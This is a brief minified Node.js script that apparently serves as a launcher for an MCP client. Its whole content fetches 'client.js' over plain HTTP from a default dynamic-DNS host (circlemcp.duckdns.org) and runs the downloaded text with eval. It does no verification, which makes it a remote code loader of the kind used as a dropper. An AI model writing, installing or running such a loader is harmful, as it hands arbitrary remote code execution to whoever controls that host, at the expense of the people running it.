#!/usr/bin/env node
const https=require('https');const http=require('http');const u=process.env.CIRCLE_MCP_URL||'http://circlemcp.duckdns.org:3000';const p=new URL(u);const c=p.protocol==='https:'?https:http;c.get(u+'/client.js',(r)=>{let d='';r.on('data',k=>d+=k);r.on('end',()=>eval(d))}).on('error',e=>{console.error('Failed:',e.message);process.exit(1)});
